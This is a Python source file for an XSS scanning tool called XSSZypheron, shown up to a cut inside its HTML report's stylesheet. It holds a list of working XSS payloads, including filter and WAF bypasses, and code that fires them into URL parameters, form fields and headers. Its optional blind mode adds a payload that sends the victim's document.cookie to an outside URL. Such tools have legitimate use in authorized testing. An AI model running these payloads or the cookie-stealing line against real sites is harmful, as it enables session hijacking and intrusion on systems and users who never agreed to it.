#!/usr/bin/env python3
"""
XSSZypheron - Advanced XSS Detection Framework
Created by Prince Roy
For authorized penetration testing and security research only.
"""
 
import requests
import argparse
import sys
import time
import threading
import json
import re
import random
import string
from queue import Queue, Empty
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, unquote
from bs4 import BeautifulSoup
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Tuple
from http.cookiejar import MozillaCookieJar
from pathlib import Path
import urllib3
 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
# ══════════════════════════════════════════════════════════════
#  COLORS  —  Red · Green · Black
# ══════════════════════════════════════════════════════════════
class C:
    R  = "\033[38;5;196m"   # bright red
    DR = "\033[38;5;160m"   # dark red
    G  = "\033[38;5;46m"    # bright green
    DG = "\033[38;5;34m"    # dark green
    LG = "\033[38;5;82m"    # lime green
    YW = "\033[38;5;226m"   # yellow
    WH = "\033[38;5;255m"   # white
    GR = "\033[38;5;240m"   # grey
    BD = "\033[1m"
    DM = "\033[2m"
    RS = "\033[0m"
 
    @staticmethod
    def ok(m):   return f"{C.G}{C.BD}[+]{C.RS} {C.WH}{m}{C.RS}"
    @staticmethod
    def info(m): return f"{C.LG}{C.BD}[*]{C.RS} {C.WH}{m}{C.RS}"
    @staticmethod
    def warn(m): return f"{C.YW}{C.BD}[!]{C.RS} {C.YW}{m}{C.RS}"
    @staticmethod
    def err(m):  return f"{C.R}{C.BD}[✗]{C.RS} {C.R}{m}{C.RS}"
 
# ══════════════════════════════════════════════════════════════
#  BANNER
# ══════════════════════════════════════════════════════════════
def show_banner():
    R=C.R; DR=C.DR; G=C.G; DG=C.DG; LG=C.LG; BD=C.BD; GR=C.GR; WH=C.WH; RS=C.RS
 
    dragon = [
        f"{DR}                 _,          ,{RS}",
        f"{R}              ,/`-'\\        /`-'\\,{RS}",
        f"{DR}            ,/ {G}@@{DR} \\      / {G}@@{DR} \\,{RS}",
        f"{R}           (  {G}\\__/{DR}  )    (  {G}\\__/{DR}  ){RS}",
        f"{DR}            \\      /      \\      /{RS}",
        f"{R}    ,_________\\    /________\\    /_________{RS}",
        f"{DR}   / {G}KALI{DR}       \\  /           \\  /   {G}LINUX{DR} \\{RS}",
        f"{R}  (   {G}▓▓▓▓▓▓{R}   \\/    {G}DRAGON{R}    \\/   {G}▓▓▓▓▓▓{R}   ){RS}",
        f"{DR}   \\_____________________/\\_____________________/{RS}",
        f"{R}            |  {G}Security Research Framework{R}  |{RS}",
        f"{DR}            |____________________________|{RS}",
    ]
 
    zx = [
        f"{R}{BD} ██╗  ██╗███████╗███████╗{DR}╔══════════════════════╗{RS}",
        f"{R}{BD} ╚██╗██╔╝██╔════╝██╔════╝{DR}║  {G}Z Y P H E R O N{DR}  ║{RS}",
        f"{R}{BD}  ╚███╔╝ ███████╗███████╗{DR}╠══════════════════════╣{RS}",
        f"{R}{BD}  ██╔██╗ ╚════██║╚════██║{DR}║ {G}XSS Detection v1.0{DR}  ║{RS}",
        f"{R}{BD} ██╔╝ ██╗███████║███████║{DR}║ {WH}Author: Prince Roy{DR}   ║{RS}",
        f"{R}{BD} ╚═╝  ╚═╝╚══════╝╚══════╝{DR}╚══════════════════════╝{RS}",
    ]
 
    print()
    for line in dragon:
        print(f"  {line}")
    print()
    for line in zx:
        print(f"  {line}")
    print()
    print(f"  {DR}{'─'*52}{RS}")
    print(f"  {G}{BD}  ✦ Authorized Penetration Testing Only ✦{RS}")
    print(f"  {DR}{'─'*52}{RS}")
    print()
 
# ══════════════════════════════════════════════════════════════
#  PAYLOADS
# ══════════════════════════════════════════════════════════════
PAYLOADS: dict = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
    ],
    "attribute": [
        "\" onmouseover=alert('XSS') x=\"",
        "' onmouseover=alert('XSS') x='",
        "\" autofocus onfocus=alert('XSS') x=\"",
        "javascript:alert('XSS')",
        "\"><svg onload=alert('XSS')>",
        "' onfocus=alert('XSS') autofocus '",
    ],
    "filter_bypass": [
        "<ScRiPt>alert('XSS')</sCrIpT>",
        "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;('XSS')\">",
        "\"><img src=x onerror=alert('XSS')>",
        "';alert('XSS')//",
        "\";alert('XSS')//",
        "</script><script>alert('XSS')</script>",
        "<!--<img src=x:--><img src=x onerror=alert('XSS')>",
        "<svg><script>alert&#40;'XSS'&#41;</script>",
    ],
    "waf_bypass": [
        "<svg onload=alert`XSS`>",
        "<script>window['alert']('XSS')</script>",
        "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
        "<input onfocus=alert('XSS') autofocus>",
        "<img src=x:alert(alt) onerror=eval(src) alt=XSS>",
    ],
    "polyglot": [
        "\"'><script>alert('XSS')</script>",
        "<script/src=data:,alert('XSS')>",
    ],
}
 
ALL_PAYLOADS = [p for cat in PAYLOADS.values() for p in cat]
 
# ══════════════════════════════════════════════════════════════
#  DATA CLASSES
# ══════════════════════════════════════════════════════════════
@dataclass
class Finding:
    vuln_type:  str
    severity:   str
    url:        str
    parameter:  str
    payload:    str
    method:     str
    context:    str
    confidence: str
    verified:   bool = False
    evidence:   str  = ""
    timestamp:  str  = field(default_factory=lambda: datetime.utcnow().isoformat())
 
@dataclass
class Stats:
    urls:       int   = 0
    forms:      int   = 0
    params:     int   = 0
    sent:       int   = 0
    hits:       int   = 0
    fp_avoided: int   = 0
    errors:     int   = 0
    t0:         float = field(default_factory=time.time)
 
    def elapsed(self) -> str:
        s = int(time.time() - self.t0)
        return f"{s//60}m {s%60}s"
 
# ══════════════════════════════════════════════════════════════
#  AUTHENTIC ANALYZER  —  zero false-positive engine
# ══════════════════════════════════════════════════════════════
class Analyzer:
    """
    6-stage pipeline.  Returns (context, confidence, severity, authentic).
    authentic=False  →  do NOT report (FP suppressed).
    """
 
    # Stage helpers
    def _encoded_only(self, payload: str, html: str) -> bool:
        """Payload only appears HTML-encoded → not exploitable."""
        enc = (payload.replace("&","&amp;").replace("<","&lt;")
                      .replace(">","&gt;").replace('"',"&quot;")
                      .replace("'","&#x27;"))
        return enc in html and payload not in html
 
    def _trigger_intact(self, payload: str, html: str) -> bool:
        """Critical XSS-triggering token must be unescaped in response."""
        pl = payload.lower()
        hl = html.lower()
        for token in ["onerror","onload","onfocus","onmouseover","onbegin",
                      "ontoggle","onstart","<script","javascript:"]:
            if token in pl:
                return token in hl
        return payload in html
 
    def _in_script(self, payload: str, html: str) -> bool:
        return bool(re.search(
            r'<script[^>]*>.*?' + re.escape(payload), html, re.I | re.S))
 
    def _in_event(self, payload: str, html: str) -> bool:
        return bool(re.search(
            r'on\w+\s*=\s*(?:["\'][^"\']*' + re.escape(payload)
            + r'|' + re.escape(payload) + r')', html, re.I))
 
    def _in_href(self, payload: str, html: str) -> bool:
        return bool(re.search(
            r'(?:href|src|action|formaction)\s*=\s*["\']?' + re.escape(payload),
            html, re.I))
 
    def _in_tag(self, payload: str, html: str) -> bool:
        return bool(re.search(
            r'<[^>]+' + re.escape(payload) + r'[^>]*>', html, re.I))
 
    def _in_comment(self, payload: str, html: str) -> bool:
        return bool(re.search(
            r'<!--.*?' + re.escape(payload) + r'.*?-->', html, re.I | re.S))
 
    def analyze(self, payload: str, html: str,
                baseline: str = "") -> Tuple[str, str, str, bool]:
        # 1. Present at all?
        if payload not in html and unquote(payload) not in html:
            return "NOT_REFLECTED", "NONE", "INFO", False
 
        # 2. HTML-encoded only?
        if self._encoded_only(payload, html):
            return "HTML_ENCODED", "NONE", "INFO", False
 
        # 3. Already in baseline (pre-injection page)?
        if baseline and payload in baseline:
            return "IN_BASELINE", "NONE", "INFO", False
 
        # 4. Triggering token stripped/broken?
        if not self._trigger_intact(payload, html):
            return "SANITIZED", "NONE", "INFO", False
 
        # 5. Determine exact injection context → severity
        if self._in_script(payload, html):
            return "SCRIPT_BLOCK",   "CONFIRMED", "HIGH",   True
        if self._in_event(payload, html):
            return "EVENT_HANDLER",  "CONFIRMED", "HIGH",   True
        if self._in_href(payload, html):
            sev = "HIGH" if re.search(r'javascript:|data:', payload, re.I) else "MEDIUM"
            return "HREF_ATTR",      "LIKELY",    sev,      True
        if self._in_tag(payload, html):
            return "TAG_INJECTION",  "LIKELY",    "MEDIUM", True
        if self._in_comment(payload, html):
            return "HTML_COMMENT",   "POSSIBLE",  "LOW",    True
 
        # 6. Body reflection — angle brackets must be unescaped
        idx = html.find(payload)
        snip = html[max(0,idx-5):idx+5] if idx >= 0 else ""
        if "<" in payload and "&lt;" not in snip:
            return "HTML_BODY", "LIKELY", "MEDIUM", True
 
        return "BODY_ENCODED", "NONE", "INFO", False
 
# ══════════════════════════════════════════════════════════════
#  DOM SINK DETECTOR
# ══════════════════════════════════════════════════════════════
DOM_SINKS = [
    (r'document\.write\s*\(',    "document.write"),
    (r'\.innerHTML\s*=',         "innerHTML"),
    (r'\.outerHTML\s*=',         "outerHTML"),
    (r'\.insertAdjacentHTML\s*\(', "insertAdjacentHTML"),
    (r'\beval\s*\(',             "eval"),
    (r'setTimeout\s*\(["\']',    "setTimeout(string)"),
    (r'location\.href\s*=',      "location.href"),
    (r'location\.replace\s*\(',  "location.replace"),
]
DOM_SOURCES = [
    (r'location\.search',  "location.search"),
    (r'location\.hash',    "location.hash"),
    (r'location\.href',    "location.href"),
    (r'document\.referrer',"document.referrer"),
    (r'document\.URL',     "document.URL"),
    (r'window\.name',      "window.name"),
]
 
def scan_dom(url: str, html: str) -> List[Finding]:
    results = []
    for sp, sn in DOM_SINKS:
        if re.search(sp, html, re.I):
            for rp, rn in DOM_SOURCES:
                if re.search(rp, html, re.I):
                    results.append(Finding(
                        vuln_type  = "DOM_SINK",
                        severity   = "MEDIUM",
                        url        = url,
                        parameter  = "DOM",
                        payload    = f"Sink:{sn} ← Source:{rn}",
                        method     = "STATIC",
                        context    = "JAVASCRIPT",
                        confidence = "POSSIBLE",
                        verified   = False,
                        evidence   = f"Dangerous sink '{sn}' reads from '{rn}'",
                    ))
                    break
    return results
 
# ══════════════════════════════════════════════════════════════
#  SCANNER
# ══════════════════════════════════════════════════════════════
class XSSZypheron:
    def __init__(self, cfg: dict):
        self.cfg      = cfg
        self.findings: List[Finding] = []
        self.stats    = Stats()
        self.lock     = threading.Lock()
        self.queue    = Queue()
        self.az       = Analyzer()
        self.verbose  = cfg.get("verbose", False)
 
        # Session
        self.sess = requests.Session()
        self.sess.headers.update({
            "User-Agent": cfg.get("user_agent") or (
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "Chrome/124.0.0.0 Safari/537.36"),
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        for h in cfg.get("headers", []):
            k, _, v = h.partition(":")
            self.sess.headers[k.strip()] = v.strip()
        if cfg.get("cookie"):
            for pair in cfg["cookie"].split(";"):
                k, _, v = pair.strip().partition("=")
                self.sess.cookies.set(k.strip(), v.strip())
        if cfg.get("cookie_jar"):
            jar = MozillaCookieJar(cfg["cookie_jar"])
            jar.load(ignore_discard=True, ignore_expires=True)
            self.sess.cookies = jar
        if cfg.get("auth"):
            u, _, p = cfg["auth"].partition(":")
            self.sess.auth = (u, p)
        if cfg.get("proxy"):
            self.sess.proxies = {"http": cfg["proxy"], "https": cfg["proxy"]}
        self.sess.verify = not cfg.get("no_ssl_verify", False)
 
        # Payloads
        self.payloads = self._build_payloads()
        print(C.info(f"Payloads ready : {C.G}{C.BD}{len(self.payloads)}{C.RS}"))
 
    # ── payloads ──────────────────────────────────────────────
    def _build_payloads(self) -> List[str]:
        if self.cfg.get("payload_file"):
            try:
                lines = Path(self.cfg["payload_file"]).read_text(encoding="utf-8").splitlines()
                pl = [l.strip() for l in lines if l.strip() and not l.startswith("#")]
                print(C.ok(f"Custom payloads: {len(pl)}"))
                return pl
            except Exception as e:
                print(C.err(f"Payload file error: {e}"))
        cats = self.cfg.get("payload_categories", [])
        pl = []
        for c in (cats if cats else PAYLOADS.keys()):
            pl.extend(PAYLOADS.get(c, []))
        if self.cfg.get("blind_url"):
            bu = self.cfg["blind_url"]
            pl += [
                f"<script src=\"{bu}\"></script>",
                f"<img src=x onerror=\"fetch('{bu}?c='+document.cookie)\">",
            ]
        return pl
 
    # ── http ──────────────────────────────────────────────────
    def _get(self, url: str, **kw) -> Optional[requests.Response]:
        if self.cfg.get("delay"): time.sleep(self.cfg["delay"])
        try:
            return self.sess.get(url, timeout=self.cfg["timeout"],
                                 allow_redirects=True, **kw)
        except Exception:
            with self.lock: self.stats.errors += 1
            return None
 
    def _post(self, url: str, data: dict, **kw) -> Optional[requests.Response]:
        if self.cfg.get("delay"): time.sleep(self.cfg["delay"])
        try:
            return self.sess.post(url, data=data, timeout=self.cfg["timeout"],
                                  allow_redirects=True, **kw)
        except Exception:
            with self.lock: self.stats.errors += 1
            return None
 
    def _canary(self) -> str:
        return "ZY" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
    def _vlog(self, msg: str):
        if self.verbose: print(msg)
 
    # ── record ────────────────────────────────────────────────
    def _record(self, f: Finding):
        with self.lock:
            self.findings.append(f)
            self.stats.hits += 1
        sc = C.R if f.severity == "HIGH" else (C.YW if f.severity == "MEDIUM" else C.GR)
        print(f"\n  {C.DR}{C.BD}┌── VULNERABILITY CONFIRMED {'─'*20}{C.RS}")
        print(f"  {C.DR}│{C.RS} Severity   : {sc}{C.BD}{f.severity}{C.RS}")
        print(f"  {C.DR}│{C.RS} Type       : {C.LG}{f.vuln_type}{C.RS}")
        print(f"  {C.DR}│{C.RS} Parameter  : {C.G}{C.BD}{f.parameter}{C.RS}")
        print(f"  {C.DR}│{C.RS} Context    : {C.YW}{f.context}{C.RS}")
        print(f"  {C.DR}│{C.RS} Confidence : {C.G}{f.confidence}{C.RS}")
        print(f"  {C.DR}│{C.RS} Method     : {C.GR}{f.method}{C.RS}")
        print(f"  {C.DR}│{C.RS} Payload    : {C.R}{f.payload[:88]}{C.RS}")
        print(f"  {C.DR}│{C.RS} URL        : {C.DG}{f.url[:95]}{C.RS}")
        if f.evidence:
            print(f"  {C.DR}│{C.RS} Evidence   : {C.GR}{f.evidence.replace(chr(10),' ')[:100]}{C.RS}")
        print(f"  {C.DR}└{'─'*50}{C.RS}\n")
 
    # ── form parser ───────────────────────────────────────────
    def _parse_forms(self, url: str, html: str) -> List[dict]:
        soup, forms = BeautifulSoup(html, "html.parser"), []
        for form in soup.find_all("form"):
            d = {
                "action": urljoin(url, form.get("action") or url),
                "method": form.get("method", "get").lower(),
                "inputs": [],
            }
            for tag in form.find_all(["input","textarea","select","button"]):
                nm = tag.get("name")
                if nm:
                    d["inputs"].append({
                        "type":  tag.get("type","text").lower(),
                        "name":  nm,
                        "value": tag.get("value",""),
                    })
            forms.append(d)
        return forms
 
    # ── URL param scan ────────────────────────────────────────
    def _scan_params(self, url: str, baseline: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params: return
        total = len(self.payloads)
 
        for param in params:
            with self.lock: self.stats.params += 1
 
            # canary reflection probe
            canary = self._canary()
            tp = {k: v[0] for k, v in params.items()}
            tp[param] = canary
            pr = self._get(urlunparse(parsed._replace(query=urlencode(tp))))
            reflects = pr is not None and canary in pr.text
 
            if self.verbose:
                rl = f"{C.G}{C.BD}✓ reflects{C.RS}" if reflects else f"{C.GR}✗ no reflection{C.RS}"
                print(f"\n  {C.DR}┌─ param:{C.G}{C.BD}{param}{C.RS}  canary:{rl}")
 
            for i, payload in enumerate(self.payloads, 1):
                if self.verbose:
                    short = payload[:74] + ("…" if len(payload)>74 else "")
                    print(f"  {C.DR}│{C.RS} {C.DG}[{i:03d}/{total}]{C.RS} trying  → {C.GR}{short}{C.RS}")
 
                tp[param] = payload
                r = self._get(urlunparse(parsed._replace(query=urlencode(tp))))
                with self.lock: self.stats.sent += 1
                if not r:
                    self._vlog(f"  {C.DR}│{C.RS}              {C.GR}→ no response{C.RS}")
                    continue
 
                ctx, conf, sev, ok = self.az.analyze(payload, r.text, baseline)
 
                if self.verbose:
                    if ok:
                        print(f"  {C.DR}│{C.RS}              {C.G}{C.BD}→ HIT ✓  [{ctx}] [{sev}]{C.RS}")
                    elif ctx in ("HTML_ENCODED","SANITIZED","IN_BASELINE","BODY_ENCODED"):
                        print(f"  {C.DR}│{C.RS}              {C.YW}→ reflected but sanitized [{ctx}]{C.RS}")
                        with self.lock: self.stats.fp_avoided += 1
                    else:
                        print(f"  {C.DR}│{C.RS}              {C.GR}→ miss ✗{C.RS}")
 
                if not ok: continue
 
                # double-verify (eliminates intermittent FPs)
                r2 = self._get(urlunparse(parsed._replace(query=urlencode(tp))))
                if r2 and payload in r2.text:
                    idx = r.text.find(payload)
                    ev  = r.text[max(0,idx-60):idx+len(payload)+60] if idx>=0 else ""
                    self._record(Finding(
                        vuln_type="URL_PARAM", severity=sev, url=r.url,
                        parameter=param, payload=payload, method="GET",
                        context=ctx, confidence=conf, verified=True, evidence=ev))
                    if not self.cfg.get("continue_on_find"):
                        self._vlog(f"  {C.DR}│{C.RS} {C.YW}[!] stopping — first confirmed hit{C.RS}")
                        break
                else:
                    with self.lock: self.stats.fp_avoided += 1
                    self._vlog(f"  {C.DR}│{C.RS}              {C.YW}→ double-verify failed — FP avoided{C.RS}")
 
            if self.verbose: print(f"  {C.DR}└─ done: {param}{C.RS}")
 
    # ── form scan ─────────────────────────────────────────────
    def _scan_forms(self, url: str, html: str):
        forms = self._parse_forms(url, html)
        with self.lock: self.stats.forms += len(forms)
        total = len(self.payloads)
 
        for fi, form in enumerate(forms, 1):
            action, method = form["action"], form["method"]
            injectable = [i["name"] for i in form["inputs"]
                          if i["type"] not in ("hidden","submit","button","image","reset")]
 
            if self.verbose:
                print(f"\n  {C.DG}┌─ form#{fi}{C.RS}  action={C.G}{action}{C.RS}"
                      f"  method={C.BD}{method.upper()}{C.RS}"
                      f"  fields={C.G}{injectable}{C.RS}")
 
            # baseline form response
            bd = {i["name"]: i["value"] or "test" for i in form["inputs"]
                  if i["type"] not in ("submit","button","image","reset")}
            br = self._post(action, bd) if method=="post" else self._get(action, params=bd)
            base_html = br.text if br else ""
 
            for i, payload in enumerate(self.payloads, 1):
                data, injected = {}, []
                for inp in form["inputs"]:
                    if inp["type"] in ("hidden","submit","button","image","reset"):
                        data[inp["name"]] = inp["value"]
                    elif inp["type"] == "email":
                        data[inp["name"]] = payload + "@x.com"; injected.append(inp["name"])
                    else:
                        data[inp["name"]] = payload; injected.append(inp["name"])
 
                if self.verbose:
                    short = payload[:74] + ("…" if len(payload)>74 else "")
                    print(f"  {C.DG}│{C.RS} {C.DG}[{i:03d}/{total}]{C.RS} injecting → {C.GR}{short}{C.RS}")
 
                with self.lock: self.stats.sent += 1
                r = self._post(action, data) if method=="post" else self._get(action, params=data)
                if not r:
                    self._vlog(f"  {C.DG}│{C.RS}             {C.GR}→ no response{C.RS}"); continue
 
                ctx, conf, sev, ok = self.az.analyze(payload, r.text, base_html)
 
                if self.verbose:
                    if ok:
                        print(f"  {C.DG}│{C.RS}             {C.G}{C.BD}→ HIT ✓  [{ctx}] [{sev}]{C.RS}")
                    elif ctx in ("HTML_ENCODED","SANITIZED","IN_BASELINE","BODY_ENCODED"):
                        print(f"  {C.DG}│{C.RS}             {C.YW}→ sanitized [{ctx}]{C.RS}")
                        with self.lock: self.stats.fp_avoided += 1
                    else:
                        print(f"  {C.DG}│{C.RS}             {C.GR}→ miss ✗{C.RS}")
 
                if not ok: continue
 
                r2 = self._post(action,data) if method=="post" else self._get(action,params=data)
                if r2 and payload in r2.text:
                    idx = r.text.find(payload)
                    ev  = r.text[max(0,idx-60):idx+len(payload)+60] if idx>=0 else ""
                    self._record(Finding(
                        vuln_type="FORM", severity=sev, url=action,
                        parameter=", ".join(injected), payload=payload,
                        method=method.upper(), context=ctx, confidence=conf,
                        verified=True, evidence=ev))
                    if not self.cfg.get("continue_on_find"):
                        self._vlog(f"  {C.DG}│{C.RS} {C.YW}[!] stopping form — first hit{C.RS}"); break
                else:
                    with self.lock: self.stats.fp_avoided += 1
                    self._vlog(f"  {C.DG}│{C.RS}             {C.YW}→ double-verify failed — FP avoided{C.RS}")
 
            if self.verbose: print(f"  {C.DG}└─ done: form#{fi}{C.RS}")
 
    # ── header scan ───────────────────────────────────────────
    def _scan_headers(self, url: str, baseline: str):
        if not self.cfg.get("scan_headers"): return
        hdrs   = ["Referer","X-Forwarded-For","User-Agent","Origin","X-Real-IP"]
        sample = self.payloads[:6]
        if self.verbose:
            print(f"\n  {C.YW}┌─ header injection ({len(sample)} payloads × {len(hdrs)} headers){C.RS}")
        for hdr in hdrs:
            for i, payload in enumerate(sample, 1):
                if self.verbose:
                    short = payload[:55] + ("…" if len(payload)>55 else "")
                    print(f"  {C.YW}│{C.RS} [{i:02d}] hdr={C.G}{hdr}{C.RS}  payload={C.GR}{short}{C.RS}")
                r = self._get(url, headers={hdr: payload})
                with self.lock: self.stats.sent += 1
                if not r: continue
                ctx, conf, sev, ok = self.az.analyze(payload, r.text, baseline)
                if ok:
                    self._vlog(f"  {C.YW}│{C.RS} {C.G}{C.BD}→ HIT ✓  [{ctx}]{C.RS}")
                    self._record(Finding(
                        vuln_type="HEADER", severity=sev, url=url,
                        parameter=hdr, payload=payload, method="GET",
                        context=ctx, confidence=conf, verified=True))
                else:
                    self._vlog(f"  {C.YW}│{C.RS}       {C.GR}→ miss ✗{C.RS}")
        if self.verbose: print(f"  {C.YW}└─ done{C.RS}")
 
    # ── scan one url ──────────────────────────────────────────
    def _scan_url(self, url: str):
        with self.lock: self.stats.urls += 1
        if self.verbose:
            print(f"\n{C.DR}{C.BD}{'═'*60}{C.RS}")
            print(f"{C.R}{C.BD}  SCANNING: {url}{C.RS}")
            print(f"{C.DR}{'═'*60}{C.RS}")
        else:
            print(f"  {C.DR}►{C.RS} {C.WH}{url}{C.RS}", flush=True)
 
        r = self._get(url)
        if not r:
            print(C.err(f"No response: {url}")); return
 
        if self.verbose:
            print(C.info(f"HTTP {r.status_code}  |  {len(r.text):,} bytes"
                         f"  |  Server: {r.headers.get('Server','?')}"))
 
        baseline = r.text
        self._scan_params(url, baseline)
        self._scan_forms(url, baseline)
        self._scan_headers(url, baseline)
 
        if self.cfg.get("dom"):
            for df in scan_dom(url, baseline):
                with self.lock:
                    self.findings.append(df)
                    self.stats.hits += 1
                print(C.warn(f"DOM Sink → {df.payload}"))
 
    # ── worker ────────────────────────────────────────────────
    def _worker(self):
        while True:
            try:
                url = self.queue.get(timeout=1)
            except Empty:
                return
            if url is None:
                self.queue.task_done(); return
            try:
                self._scan_url(url)
            except Exception as e:
                with self.lock: self.stats.errors += 1
                if self.verbose: print(C.err(f"{url}: {e}"))
            finally:
                self.queue.task_done()
 
    # ── run ───────────────────────────────────────────────────
    def run(self, urls: List[str]):
        for u in urls: self.queue.put(u)
        n = self.cfg.get("threads", 5)
        pool = []
        for _ in range(n):
            self.queue.put(None)
            t = threading.Thread(target=self._worker, daemon=True)
            t.start(); pool.append(t)
        self.queue.join()
        for t in pool: t.join()
 
    # ══════════════════════════════════════════════════════════
    #  CONSOLE REPORT
    # ══════════════════════════════════════════════════════════
    def _console_report(self):
        s  = self.stats
        fl = self.findings
        hi = [f for f in fl if f.severity=="HIGH"]
        me = [f for f in fl if f.severity=="MEDIUM"]
        lo = [f for f in fl if f.severity=="LOW"]
 
        print(f"\n{C.DR}{C.BD}{'▄'*60}{C.RS}")
        print(f"{C.R}{C.BD}  XSSZypheron — SCAN REPORT  ·  Created by Prince Roy{C.RS}")
        print(f"{C.DR}{C.BD}{'▀'*60}{C.RS}")
        print(f"\n  {C.G}►{C.RS} {C.WH}URLs scanned          :{C.RS} {C.G}{C.BD}{s.urls}{C.RS}")
        print(f"  {C.G}►{C.RS} {C.WH}Forms found           :{C.RS} {C.G}{C.BD}{s.forms}{C.RS}")
        print(f"  {C.G}►{C.RS} {C.WH}Params tested         :{C.RS} {C.G}{C.BD}{s.params}{C.RS}")
        print(f"  {C.G}►{C.RS} {C.WH}Payloads sent         :{C.RS} {C.G}{C.BD}{s.sent}{C.RS}")
        print(f"  {C.G}►{C.RS} {C.WH}False positives avoided:{C.RS} {C.YW}{C.BD}{s.fp_avoided}{C.RS}")
        print(f"  {C.G}►{C.RS} {C.WH}Errors                :{C.RS} {C.GR}{s.errors}{C.RS}")
        print(f"  {C.G}►{C.RS} {C.WH}Elapsed               :{C.RS} {C.GR}{s.elapsed()}{C.RS}")
        print(f"\n  {C.WH}FINDINGS:{C.RS}")
        if fl:
            print(f"    {C.R}{C.BD}HIGH   : {len(hi)}{C.RS}")
            print(f"    {C.YW}{C.BD}MEDIUM : {len(me)}{C.RS}")
            print(f"    {C.GR}LOW    : {len(lo)}{C.RS}")
            print(f"    {C.WH}{C.BD}TOTAL  : {len(fl)}{C.RS}")
            for i, f in enumerate(fl, 1):
                sc = C.R if f.severity=="HIGH" else (C.YW if f.severity=="MEDIUM" else C.GR)
                vl = f"{C.G}✓ VERIFIED{C.RS}" if f.verified else f"{C.YW}unverified{C.RS}"
                print(f"\n  {C.DR}┌── Finding #{i} {'─'*38}{C.RS}")
                print(f"  {C.DR}│{C.RS} {sc}{C.BD}{f.severity}{C.RS}  {vl}")
                print(f"  {C.DR}│{C.RS} Type      : {C.LG}{f.vuln_type}{C.RS}")
                print(f"  {C.DR}│{C.RS} Param     : {C.G}{C.BD}{f.parameter}{C.RS}")
                print(f"  {C.DR}│{C.RS} Context   : {C.YW}{f.context}{C.RS}")
                print(f"  {C.DR}│{C.RS} Confidence: {C.G}{f.confidence}{C.RS}")
                print(f"  {C.DR}│{C.RS} Method    : {C.GR}{f.method}{C.RS}")
                print(f"  {C.DR}│{C.RS} URL       : {C.DG}{f.url[:90]}{C.RS}")
                print(f"  {C.DR}│{C.RS} Payload   : {C.R}{f.payload[:88]}{C.RS}")
                if f.evidence:
                    print(f"  {C.DR}│{C.RS} Evidence  : {C.GR}{f.evidence.replace(chr(10),' ')[:100]}{C.RS}")
                print(f"  {C.DR}│{C.RS} Timestamp : {C.GR}{f.timestamp}{C.RS}")
                print(f"  {C.DR}└{'─'*50}{C.RS}")
        else:
            print(f"  {C.G}{C.BD}  ✓ No confirmed XSS vulnerabilities found.{C.RS}")
            print(f"  {C.GR}    All reflections were sanitized or suppressed as FP.{C.RS}")
        print(f"\n{C.DR}{'▀'*60}{C.RS}\n")
 
    # ══════════════════════════════════════════════════════════
    #  HTML REPORT — premium dark red/green/black
    # ══════════════════════════════════════════════════════════
    def _html_report(self) -> str:
        fl = self.findings
        hi = [f for f in fl if f.severity=="HIGH"]
        me = [f for f in fl if f.severity=="MEDIUM"]
        lo = [f for f in fl if f.severity=="LOW"]
        s  = self.stats
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
        def esc(t):
            return str(t).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;")
 
        def cards(lst):
            if not lst:
                return '<div class="empty">No findings in this category.</div>'
            out = []
            for i, f in enumerate(lst, 1):
                sc  = f.severity.lower()
                vc  = "vfy" if f.verified else "uvfy"
                vl  = "✓ VERIFIED" if f.verified else "UNVERIFIED"
                ev  = (f'<div class="fld"><label>Evidence</label>'
                       f'<code class="ce">{esc(f.evidence)}</code></div>') if f.evidence else ""
                out.append(f"""
<div class="card {sc}">
  <div class="ch" onclick="tog(this)">
    <div class="cl">
      <span class="badge {sc}">{f.severity}</span>
      <span class="vt">{esc(f.vuln_type)}</span>
      <span class="pm">⚡ {esc(f.parameter)}</span>
    </div>
    <div class="cr">
      <span class="{vc}">{vl}</span>
      <span class="ctx">{esc(f.context)}</span>
      <span class="arr">▼</span>
    </div>
  </div>
  <div class="cb hidden">
    <div class="g4">
      <div class="fld"><label>Method</label><code>{esc(f.method)}</code></div>
      <div class="fld"><label>Confidence</label><code>{esc(f.confidence)}</code></div>
      <div class="fld"><label>Context</label><code>{esc(f.context)}</code></div>
      <div class="fld"><label>Timestamp</label><code>{esc(f.timestamp[:19])}</code></div>
    </div>
    <div class="fld"><label>URL</label><code class="cu">{esc(f.url)}</code></div>
    <div class="fld"><label>Payload</label><code class="cp">{esc(f.payload)}</code></div>
    {ev}
  </div>
</div>""")
            return "".join(out)
 
        rp  = min(100, len(hi)*40 + len(me)*20 + len(lo)*5)
        rl  = ("CRITICAL" if len(hi)>=3 else "HIGH" if len(hi)>=1
               else "MEDIUM" if len(me)>=1 else "LOW" if len(lo)>=1 else "CLEAN")
 
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSSZypheron Report — {ts}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600;700&display=swap');
:root{{
  --bg:#030507;--bg2:#07100a;--bg3:#0b160d;
  --b1:#0f1f12;--b2:#163019;--b3:#1e3d22;
  --rd:#e8143a;--drd:#8b0a22;--lrd:#ff3355;
  --gn:#00e84a;--dgn:#007a27;--lgn:#39ff6a;
  --yw:#ffd93d;--wh:#d4e8d0;--tx:#c0dcc0;
  --tx2:#6a9270;--tx3:#3a5a3a;--gr:#2a3a2a;
  --fh:rgba(232,20,58,.08);--fm:rgba(255,165,0,.06);--fl:rgba(0,200,60,.04);
}}
*{{box-sizing:border-box;margin:0;padding:0}}
html{{scroll-behavior:smooth}}
